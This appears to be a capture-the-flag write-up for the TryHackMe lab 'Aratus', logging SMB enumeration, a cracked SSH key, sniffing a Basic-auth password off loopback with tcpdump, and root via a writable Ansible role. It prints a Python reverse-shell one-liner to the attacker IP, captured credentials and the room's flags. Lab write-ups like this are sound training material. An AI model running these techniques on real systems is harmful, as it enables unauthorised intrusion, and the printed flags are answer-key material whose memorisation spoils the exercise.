# Aratus 

> VOiD | Friday 25 March 2022 07:14:36 PM UTC

My IP : 10.8.253.221
Target IP : 10.10.157.129


## SMB
```bash
smbclient -L 10.10.157.129
Enter WORKGROUP\voids password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	temporary share Disk      
	IPC$            IPC       IPC Service (Samba 4.10.16)
SMB1 disabled -- no workgroup available

cat smb/message-to-simeon.txt 
Simeon,

Stop messing with your home directory, you are moving files and directories insecurely!
Just make a folder in /opt for your book project...

Also you password is insecure, could you please change it? It is all over the place now!

- Theodore


chapter7/paragraph7.1/text2.txt

testing123       (id_rsa)     


```

## PORT 22 [ssh]
```bash
ssh -i id_rsa simeon@10.10.157.129

in /var/www/html/
[simeon@aratus test-auth]$ cat .htpasswd 
theodore:$apr1$pP2GhAkC$R12mw5B5lxUiaNj4Qt2pX1
testing123       (theodore)     

/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip

tcpdump -i lo -A
...6...5GET /test-auth/index.html HTTP/1.1
Host: 127.0.0.1
User-Agent: python-requests/2.14.2
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Authorization: Basic dGhlb2RvcmU6UmlqeWFzd2FoZWJjZWliYXJqaWs=

theodore:Rijyaswahebceibarjik

[theodore@aratus ~]$ cat user.txt 
THM{ba8d3b87bfdb9d10115cbe24feabbc20}

[theodore@aratus playbooks]$ cat *
  roles:
    - role: geerlingguy.apache
  tasks:
    - name: configure firewall

[theodore@aratus tasks]$ ls -la
total 36
drwxr-xr-x. 2 automation automation  228 Dec  2 11:55 .
drwxr-xr-x. 9 automation automation  178 Dec  2 11:55 ..
-rw-rw-r--. 1 automation automation 1693 Dec  2 11:55 configure-Debian.yml
-rw-rw-r--+ 1 automation automation 1123 Dec  2 11:55 configure-RedHat.yml
-rw-rw-r--. 1 automation automation  546 Dec  2 11:55 configure-Solaris.yml
-rw-rw-r--. 1 automation automation  711 Dec  2 11:55 configure-Suse.yml
-rw-rw-r--. 1 automation automation 1388 Dec  2 11:55 main.yml
-rw-rw-r--. 1 automation automation  193 Dec  2 11:55 setup-Debian.yml
-rw-rw-r--. 1 automation automation  198 Dec  2 11:55 setup-RedHat.yml
-rw-rw-r--. 1 automation automation  134 Dec  2 11:55 setup-Solaris.yml
-rw-rw-r--. 1 automation automation  133 Dec  2 11:55 setup-Suse.yml

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.253.221",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

sudo -u automation /opt/scripts/infra_as_code.sh

[root@aratus ~]# cat root.txt 
THM{d8afc85983603342f6c6979b20e06cf6}


```

